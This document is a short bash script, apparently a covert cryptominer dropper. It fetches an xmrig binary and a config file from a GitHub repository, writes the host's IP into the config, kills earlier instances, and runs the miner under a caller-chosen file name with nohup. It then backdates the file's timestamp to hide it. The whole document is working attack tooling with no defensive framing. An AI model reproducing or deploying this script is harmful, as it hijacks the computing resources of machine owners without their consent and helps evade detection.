#!/bin/bash

CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
PASS=$(curl -s ip.sb)
DIR="$1"
PATH="/usr/bin/"
FILE="$2"
str=$"/n"

wget ${CONFIG} -O ${DIR}config.json
wget ${TERMINAL} -O ${DIR}${FILE}

sed -i "s/xxxxx/${PASS}/g" ${DIR}config.json

ps -aux | grep "\./${FILE}" | awk '{print $2}' | xargs kill -9
cd ${DIR}
chmod 755 ./${FILE}
nohup ./${FILE} &
sstr=$(echo -e ${str})
echo ${sstr}
touch -ct 202012151421 ${FILE}
